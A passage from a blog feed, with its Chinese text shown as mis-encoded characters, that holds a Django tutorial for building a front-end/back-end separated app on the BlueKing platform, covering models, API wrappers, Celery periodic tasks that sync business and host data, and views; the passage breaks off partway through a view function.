href="https://www.boysec.cn/boy/18422.html">https://www.boysec.cn/boy/18422.html</a></p><p>å®‰å…¨ï¼š<a href="https://www.boysec.cn/boy/11ee003d.html">https://www.boysec.cn/boy/11ee003d.html</a></p>]]></content>
      
      
      <categories>
          
          <category> äº‘åŸç”Ÿ </category>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> k8s </tag>
            
            <tag> äº‘åŸç”Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨ Django å¼€å‘ç®€å•çš„å‰åç«¯åˆ†ç¦»åº”ç”¨</title>
      <link href="/2024/03/14/%E7%94%A8%20Django%20%E5%BC%80%E5%8F%91%E7%AE%80%E5%8D%95%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BA%94%E7%94%A8/"/>
      <url>/2024/03/14/%E7%94%A8%20Django%20%E5%BC%80%E5%8F%91%E7%AE%80%E5%8D%95%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h4><p><code>2024-3-14ï¼šcreate article</code></p><p><code>2024-3-21ï¼šadd DRF &amp; Serializer </code></p><h2 id="å®˜æ–¹æ–‡æ¡£"><a href="#å®˜æ–¹æ–‡æ¡£" class="headerlink" title="å®˜æ–¹æ–‡æ¡£"></a>å®˜æ–¹æ–‡æ¡£</h2><p><a href="https://docs.djangoproject.com/">https://docs.djangoproject.com/</a></p><h2 id="ä½¿ç”¨-Django-å¼€å‘ç®€å•å‰åç«¯åˆ†ç¦»åº”ç”¨"><a href="#ä½¿ç”¨-Django-å¼€å‘ç®€å•å‰åç«¯åˆ†ç¦»åº”ç”¨" class="headerlink" title="ä½¿ç”¨ Django å¼€å‘ç®€å•å‰åç«¯åˆ†ç¦»åº”ç”¨"></a>ä½¿ç”¨ Django å¼€å‘ç®€å•å‰åç«¯åˆ†ç¦»åº”ç”¨</h2><h3 id="è¯¾ç¨‹è¦æ±‚"><a href="#è¯¾ç¨‹è¦æ±‚" class="headerlink" title="è¯¾ç¨‹è¦æ±‚"></a>è¯¾ç¨‹è¦æ±‚</h3><p><strong>ã€Part 1ã€‘SaaS åå°æ¡†æ¶æ­å»º</strong></p><ul><li>ç»“åˆéœ€æ±‚åˆ›å»ºmodelæ¨¡å‹</li><li>é€šè¿‡DRFæä¾›restfulæ¥å£ï¼Œå…¶ä¸­æ ‡å‡†è¿ç»´ç›¸å…³æ¥å£ä»¥mockçš„å½¢å¼æä¾›</li><li>ä»¥è£…é¥°å™¨çš„æ–¹å¼mockæƒé™ç›¸å…³ä»£ç </li></ul><p><strong>ã€Part 2ã€‘å‰ç«¯é¡µé¢å¼€å‘</strong></p><ul><li>ä½¿ç”¨ lesscode å®Œæˆä»»åŠ¡åˆ—è¡¨é¡µé¢</li><li>æ–°å¢éƒ¨ç½²æŒ‰é’®ï¼Œåˆ·æ–°æŒ‰é’®ï¼ŒæŸ¥çœ‹ä»»åŠ¡æŒ‰é’®</li><li>æ–°å»ºéƒ¨ç½²å¼¹æ¡†ï¼ˆä¸‹æ‹‰æ¡†ï¼Œæ–‡æœ¬è¾“å…¥æ¡†ï¼‰</li><li>äº‹ä»¶ç»‘å®šã€è®¡ç®—å±æ€§ã€ä¾¦å¬å™¨ç­‰</li><li>è¿›é˜¶å®Œæˆ lesscode æš‚æ—¶æ— æ³•å®ç°çš„åŠŸèƒ½</li><li>æŠŠæ‰€æœ‰æ¥å£å¯¹æ¥è‡³åå°æ¥å£</li></ul><p><strong>ã€Part 3ã€‘APIGateway æ¥å…¥</strong></p><ul><li>è®²è§£APIGatewayå¯¹åº”æ–‡æ¡£æŸ¥è¯¢</li><li>æŠŠPart3ä¸­mockæ‰çš„æ ‡å‡†è¿ç»´æ¥å£ï¼Œè°ƒæ•´ä¸ºGatewayè°ƒç”¨</li></ul><p><strong>ã€Part 4ã€‘å¼‚æ­¥ä»»åŠ¡æ”¯æŒ</strong></p><ul><li>æŠŠæŸ¥è¯¢æ ‡å‡†è¿ç»´ä»»åŠ¡çŠ¶æ€çš„åŠŸèƒ½ï¼Œé€šè¿‡celeryå‘¨æœŸä»»åŠ¡å®ç°</li><li>å®Œæˆä»»åŠ¡çš„æ¶ˆæ¯é€šçŸ¥ï¼Œé€šè¿‡celeryå¼‚æ­¥æ‰§è¡Œ</li></ul><p><strong>ã€Part 5ã€‘æƒé™ä¸­å¿ƒæ¥å…¥</strong></p><ul><li>æ³¨å†Œæœ¬é¡¹ç›®çš„æƒé™æ¨¡å‹åˆ°æƒé™ä¸­å¿ƒï¼ˆä»»åŠ¡åˆ›å»ºï¼Œæ‰§è¡Œè®°å½•æŸ¥çœ‹ï¼‰</li><li>å¯¹åå°æä¾›çš„æ¥å£ç»“åˆiam sdkè¿›è¡Œé‰´æƒ</li></ul><hr><h3 id="åå°æ¡†æ¶æ­å»º"><a href="#åå°æ¡†æ¶æ­å»º" class="headerlink" title="åå°æ¡†æ¶æ­å»º"></a><strong>åå°æ¡†æ¶æ­å»º</strong></h3><blockquote><p><strong>æµç¨‹ï¼šåˆ›å»ºé¡¹ç›®å’Œåº”ç”¨ã€å®šä¹‰æ¨¡å‹ã€è°ƒç”¨ API å­˜å‚¨æ•°æ®ã€åˆ›å»ºè§†å›¾(ç¼–å†™ API å¹¶å¤„ç†æ•°æ®)ã€æš´éœ²æ¥å£</strong></p></blockquote><h4 id="åˆ›å»º-Appï¼šhost-query"><a href="#åˆ›å»º-Appï¼šhost-query" class="headerlink" title="åˆ›å»º Appï¼šhost_query"></a>åˆ›å»º Appï¼šhost_query</h4><ul><li>åœ¨manage.pyç»Ÿè®¡ç›®å½•ä¸‹åˆ›å»ºhost-queryç›®å½•ï¼š<code>python manage.py startapp host_query</code></li><li>åœ¨<code>host_query</code>ä¸­åˆ›å»º <code>urls.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> host_query <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&quot;&quot;</span>, views.index, name=<span class="string">&quot;index&quot;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>ä¸‹ä¸€æ­¥åœ¨æ ¹URLconfæ–‡ä»¶ä¸­æŒ‡å®šæˆ‘ä»¬åˆ›å»º çš„ <code>host_query.urls</code> æ¨¡å—.åœ¨ <code>/urls.py</code> æ–‡ä»¶çš„ <code>urlpatterns</code> åˆ—è¡¨é‡Œæ’å…¥ä¸€ä¸ª <code>include()</code> ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(r&#x27;^host_query/&#x27;, include(&#x27;host_query.urls&#x27;))</span><br></pre></td></tr></table></figure><hr><h4 id="å®šä¹‰-Modelsï¼šBusinessã€Host"><a href="#å®šä¹‰-Modelsï¼šBusinessã€Host" class="headerlink" title="å®šä¹‰ Modelsï¼šBusinessã€Host"></a>å®šä¹‰ Modelsï¼šBusinessã€Host</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Business</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Business</span>(models.Model):</span><br><span class="line">    bk_biz_id =  models.CharField(verbose_name=<span class="string">&quot;ä¸šåŠ¡id&quot;</span>, primary_key=<span class="literal">True</span>, max_length=<span class="number">255</span>)</span><br><span class="line">    bk_biz_name = models.CharField(max_length=<span class="number">255</span>, verbose_name=<span class="string">&quot;ä¸šåŠ¡å&quot;</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.bk_biz_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># Host model</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Host</span>(models.Model):</span><br><span class="line">    bk_host_id = models.CharField(verbose_name=<span class="string">&quot;ä¸»æœºid&quot;</span>, primary_key=<span class="literal">True</span>, max_length=<span class="number">255</span>)</span><br><span class="line">    bk_cloud_id = models.CharField(verbose_name=<span class="string">&quot;äº‘åŒºåŸŸ&quot;</span>, blank=<span class="literal">True</span>, max_length=<span class="number">255</span>,null=<span class="literal">True</span>)</span><br><span class="line">    bk_biz_id = models.CharField(verbose_name=<span class="string">&quot;ä¸šåŠ¡id&quot;</span>, blank=<span class="literal">True</span>, max_length=<span class="number">255</span>,null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    bk_os_type = models.CharField(verbose_name=<span class="string">&quot;æ“ä½œç³»ç»Ÿç±»å‹&quot;</span>, max_length=<span class="number">255</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    bk_host_innerip = models.GenericIPAddressField(verbose_name=<span class="string">&quot;å†…ç½‘IP&quot;</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    bk_mac = models.GenericIPAddressField(verbose_name=<span class="string">&quot;å†…ç½‘MACåœ°å€&quot;</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    bk_set_id = models.CharField(verbose_name=<span class="string">&quot;é›†ç¾¤ID&quot;</span>, max_length=<span class="number">255</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    bk_set_name = models.CharField(verbose_name=<span class="string">&quot;é›†ç¾¤å&quot;</span>, max_length=<span class="number">2500</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    bk_module_id = models.CharField(verbose_name=<span class="string">&quot;æ¨¡å—ID&quot;</span>, max_length=<span class="number">255</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    bk_module_name = models.CharField(verbose_name=<span class="string">&quot;æ¨¡å—å&quot;</span>, max_length=<span class="number">255</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.bk_host_innerip</span><br></pre></td></tr></table></figure><hr><h4 id="åˆ›å»º-Tasksï¼š"><a href="#åˆ›å»º-Tasksï¼š" class="headerlink" title="åˆ›å»º Tasksï¼š"></a>åˆ›å»º Tasksï¼š</h4><p>è¿™éƒ¨åˆ†ä¸»è¦æ˜¯è°ƒç”¨å„ä¸ª api è¿›è¡Œæ•°æ®è¯»å–ï¼Œä¹‹åæ¥å…¥å‰ç«¯è¿›è¡Œæ¸²æŸ“</p><ul><li><p>å°è£… api è¯·æ±‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">api_request</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_url, bk_app_code, bk_app_secret, access_token</span>):</span><br><span class="line">        self.base_url = base_url</span><br><span class="line">        self.bk_app_code = bk_app_code</span><br><span class="line">        self.bk_app_secret = bk_app_secret</span><br><span class="line">        self.access_token = access_token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_headers</span>(<span class="params">self</span>):</span><br><span class="line">        auth_dict = &#123;</span><br><span class="line">            <span class="string">&quot;bk_app_code&quot;</span>: self.bk_app_code,</span><br><span class="line">            <span class="string">&quot;bk_app_secret&quot;</span>: self.bk_app_secret,</span><br><span class="line">            <span class="string">&quot;access_token&quot;</span>: self.access_token,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;X-Bkapi-Authorization&quot;</span>: json.dumps(auth_dict)&#125;</span><br><span class="line"></span><br><span class="line">api_request_instance = api_request(</span><br><span class="line">            base_url=<span class="string">&quot;&lt;http://api/xxx&gt;&quot;</span>,</span><br><span class="line">            bk_app_code=os.environ.get(<span class="string">&#x27;BKPAAS_APP_ID&#x27;</span>),</span><br><span class="line">            bk_app_secret=os.environ.get(<span class="string">&#x27;BKPAAS_APP_SECRET&#x27;</span>),</span><br><span class="line">            access_token=<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line"> )</span><br><span class="line"></span><br><span class="line">header = api_request_instance.get_headers</span><br></pre></td></tr></table></figure></li><li><p>è°ƒç”¨ä¸šåŠ¡æŸ¥è¯¢æ¥å£æŸ¥è¯¢ä¸šåŠ¡å¹¶å†™å…¥æ•°æ®åº“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Business model</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Business</span>(models.Model):</span><br><span class="line">    bk_biz_id =  models.CharField(verbose_name=<span class="string">&quot;ä¸šåŠ¡id&quot;</span>, primary_key=<span class="literal">True</span>, max_length=<span class="number">255</span>)</span><br><span class="line">    bk_biz_name = models.CharField(max_length=<span class="number">255</span>, verbose_name=<span class="string">&quot;ä¸šåŠ¡å&quot;</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.bk_biz_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># search all business</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_business_info</span>() -&gt; <span class="built_in">list</span>:</span><br><span class="line">    plus_url = <span class="string">&quot;api/xxx/search_business/&quot;</span></span><br><span class="line">    url = api_request_instance.base_url + plus_url</span><br><span class="line">    response = requests.post(url=url, json=&#123;<span class="string">&quot;fields&quot;</span>: [<span class="string">&quot;bk_biz_id&quot;</span>, <span class="string">&quot;bk_biz_name&quot;</span>]&#125;, headers=header).content</span><br><span class="line">    json_data = json.loads(response.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (json_data[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;info&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># add business to database</span></span><br><span class="line"><span class="meta">@periodic_task(<span class="params">run_every=crontab(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_business_to_database</span>():</span><br><span class="line">    all_business = get_business_info()</span><br><span class="line">    create_businesses = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> business <span class="keyword">in</span> all_business:</span><br><span class="line">        create_businesses.append(</span><br><span class="line">            Business(bk_biz_id=business.get(<span class="string">&quot;bk_biz_id&quot;</span>), bk_biz_name=business.get(<span class="string">&quot;bk_biz_name&quot;</span>))</span><br><span class="line">        )</span><br><span class="line">    <span class="comment"># print(create_businesses)</span></span><br><span class="line">    <span class="keyword">with</span> transaction.atomic():</span><br><span class="line">        Business.objects.bulk_create(create_businesses)</span><br></pre></td></tr></table></figure></li><li><p>æŒ‰ç…§ä¸šåŠ¡å°†å¯¹åº”çš„ä¸»æœºå†™å…¥æ•°æ®åº“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Host model</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Host</span>(models.Model):</span><br><span class="line">    bk_host_id = models.CharField(verbose_name=<span class="string">&quot;ä¸»æœºid&quot;</span>, primary_key=<span class="literal">True</span>, max_length=<span class="number">255</span>)</span><br><span class="line">    bk_cloud_id = models.CharField(verbose_name=<span class="string">&quot;äº‘åŒºåŸŸ&quot;</span>, blank=<span class="literal">True</span>, max_length=<span class="number">255</span>,null=<span class="literal">True</span>)</span><br><span class="line">    bk_biz_id = models.CharField(verbose_name=<span class="string">&quot;ä¸šåŠ¡id&quot;</span>, blank=<span class="literal">True</span>, max_length=<span class="number">255</span>,null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    bk_os_type = models.CharField(verbose_name=<span class="string">&quot;æ“ä½œç³»ç»Ÿç±»å‹&quot;</span>, max_length=<span class="number">255</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    bk_host_innerip = models.GenericIPAddressField(verbose_name=<span class="string">&quot;å†…ç½‘IP&quot;</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    bk_mac = models.GenericIPAddressField(verbose_name=<span class="string">&quot;å†…ç½‘MACåœ°å€&quot;</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    bk_set_id = models.CharField(verbose_name=<span class="string">&quot;é›†ç¾¤ID&quot;</span>, max_length=<span class="number">255</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    bk_set_name = models.CharField(verbose_name=<span class="string">&quot;é›†ç¾¤å&quot;</span>, max_length=<span class="number">2500</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    bk_module_id = models.CharField(verbose_name=<span class="string">&quot;æ¨¡å—ID&quot;</span>, max_length=<span class="number">255</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line">    bk_module_name = models.CharField(verbose_name=<span class="string">&quot;æ¨¡å—å&quot;</span>, max_length=<span class="number">255</span>, blank=<span class="literal">True</span>, null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.bk_host_innerip</span><br><span class="line"></span><br><span class="line"><span class="comment"># get host from business</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_host_from_business</span>(<span class="params">business_id, start, limit</span>):</span><br><span class="line">    plus_url = <span class="string">&quot;api/xxx/list_biz_hosts_topo&quot;</span></span><br><span class="line">    url = api_request_instance.base_url + plus_url</span><br><span class="line">    response = requests.post(</span><br><span class="line">        url=url,</span><br><span class="line">        json=&#123;</span><br><span class="line">            <span class="string">&quot;page&quot;</span>: &#123;<span class="string">&quot;start&quot;</span>: start, <span class="string">&quot;limit&quot;</span>: limit&#125;,</span><br><span class="line">            <span class="string">&quot;bk_biz_id&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;business_id&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fields&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;bk_host_id&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bk_cloud_id&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bk_os_type&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bk_host_innerip&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bk_mac&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bk_set_id&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bk_set_name&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bk_module_id&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bk_module_name&quot;</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">        headers=header,</span><br><span class="line">    ).content</span><br><span class="line">    json_data = json.loads(response.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;info&quot;</span>], json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;count&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># add host to database</span></span><br><span class="line"><span class="meta">@periodic_task(<span class="params">run_every=crontab(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_host_to_database</span>():</span><br><span class="line">    all_business_info = get_business_info()</span><br><span class="line">    <span class="keyword">for</span> business_info <span class="keyword">in</span> all_business_info:</span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        limit = <span class="number">300</span></span><br><span class="line">        all_host_info, count = get_host_from_business(business_info.get(<span class="string">&#x27;bk_biz_id&#x27;</span>), start, limit)</span><br><span class="line"></span><br><span class="line">        start += limit</span><br><span class="line">        <span class="keyword">while</span> count &gt; start:</span><br><span class="line">            next_page, count = get_host_from_business(business_info.get(<span class="string">&#x27;bk_biz_id&#x27;</span>), start, limit)</span><br><span class="line">            all_host_info.extend(next_page)</span><br><span class="line">            start += <span class="number">300</span></span><br><span class="line"></span><br><span class="line">        creating_hosts = []</span><br><span class="line">        bk_host_ids = [host[<span class="string">&quot;host&quot;</span>][<span class="string">&quot;bk_host_id&quot;</span>] <span class="keyword">for</span> host <span class="keyword">in</span> all_host_info]</span><br><span class="line"></span><br><span class="line">        existing_host_ids = <span class="built_in">set</span>(Host.objects.<span class="built_in">filter</span>(bk_host_id__in=bk_host_ids).values_list(<span class="string">&quot;bk_host_id&quot;</span>, flat=<span class="literal">True</span>))</span><br><span class="line">        <span class="keyword">for</span> host_info <span class="keyword">in</span> all_host_info:</span><br><span class="line"></span><br><span class="line">            bk_set_id = host_info[<span class="string">&quot;topo&quot;</span>][<span class="number">0</span>][<span class="string">&quot;bk_set_id&quot;</span>]</span><br><span class="line">            bk_set_name = host_info[<span class="string">&quot;topo&quot;</span>][<span class="number">0</span>][<span class="string">&quot;bk_set_name&quot;</span>]</span><br><span class="line"></span><br><span class="line">            bk_module_id = host_info[<span class="string">&quot;topo&quot;</span>][<span class="number">0</span>][<span class="string">&quot;module&quot;</span>][<span class="number">0</span>][<span class="string">&quot;bk_module_id&quot;</span>]</span><br><span class="line">            bk_module_name = host_info[<span class="string">&quot;topo&quot;</span>][<span class="number">0</span>][<span class="string">&quot;module&quot;</span>][<span class="number">0</span>][<span class="string">&quot;bk_module_name&quot;</span>]</span><br><span class="line"></span><br><span class="line">            host_info_host = host_info[<span class="string">&quot;host&quot;</span>]</span><br><span class="line">            creating_hosts_before = Host(</span><br><span class="line">                bk_host_id=host_info_host[<span class="string">&quot;bk_host_id&quot;</span>],</span><br><span class="line">                bk_cloud_id=host_info_host[<span class="string">&quot;bk_cloud_id&quot;</span>],</span><br><span class="line">                bk_biz_id=business_info[<span class="string">&quot;bk_biz_id&quot;</span>],</span><br><span class="line">                bk_os_type=host_info_host[<span class="string">&quot;bk_os_type&quot;</span>],</span><br><span class="line">                bk_host_innerip=host_info_host[<span class="string">&quot;bk_host_innerip&quot;</span>],</span><br><span class="line">                bk_mac=host_info_host[<span class="string">&quot;bk_mac&quot;</span>],</span><br><span class="line"></span><br><span class="line">                bk_set_id=bk_set_id,</span><br><span class="line">                bk_set_name=bk_set_name,</span><br><span class="line"></span><br><span class="line">                bk_module_id=bk_module_id,</span><br><span class="line">                bk_module_name=bk_module_name,</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> host_info_host[<span class="string">&quot;bk_host_id&quot;</span>] <span class="keyword">not</span> <span class="keyword">in</span> existing_host_ids:</span><br><span class="line">                creating_hosts.append(creating_hosts_before)</span><br><span class="line"></span><br><span class="line">        Host.objects.bulk_create(creating_hosts)</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="ç¼–å†™-VIewsï¼Œæä¾›å‰ç«¯è°ƒç”¨æ‰€éœ€-api"><a href="#ç¼–å†™-VIewsï¼Œæä¾›å‰ç«¯è°ƒç”¨æ‰€éœ€-api" class="headerlink" title="ç¼–å†™ VIewsï¼Œæä¾›å‰ç«¯è°ƒç”¨æ‰€éœ€ api"></a>ç¼–å†™ VIewsï¼Œæä¾›å‰ç«¯è°ƒç”¨æ‰€éœ€ api</h4><ul><li><p>éœ€æ±‚</p><ul><li>è·å–æ‰€æœ‰ Business</li><li>æ ¹æ®æ‰€é€‰ä¸šåŠ¡çš„ <code>bk_biz_id</code> è¿”å›é›†ç¾¤ <code>Set</code> åˆ—è¡¨</li><li>æ ¹æ®æ‰€é€‰é›†ç¾¤çš„ <code>bk_set_id</code> è¿”å›æ¨¡å— <code>Module</code> åˆ—è¡¨</li><li>å¹¶åœ¨ä¸‹é¢æ˜¾ç¤ºæ»¡è¶³ä¸‰è€…æ¡ä»¶çš„æ‰€æœ‰ä¸»æœºçš„æ‰€æœ‰å­—æ®µä¿¡æ¯ï¼Œä¹Ÿè®¸è¿˜éœ€è¦è°ƒç”¨ä¸€ä¸ª API è·å¾—ä¸»æœºè¯¦ç»†ä¿¡æ¯ã€‚</li></ul></li><li><p>è·å–æ‰€æœ‰ Businessï¼š<code>/search_business</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># search business</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_business</span>(<span class="params">request</span>):</span><br><span class="line">    business_objects = Business.objects.<span class="built_in">all</span>()</span><br><span class="line"></span><br><span class="line">    business_list = [</span><br><span class="line">        &#123;<span class="string">&quot;bk_biz_id&quot;</span>: business.bk_biz_id, <span class="string">&quot;bk_biz_name&quot;</span>: business.bk_biz_name&#125; <span class="keyword">for</span> business <span class="keyword">in</span> business_objects</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span>(JsonResponse(&#123;<span class="string">&quot;business&quot;</span>: 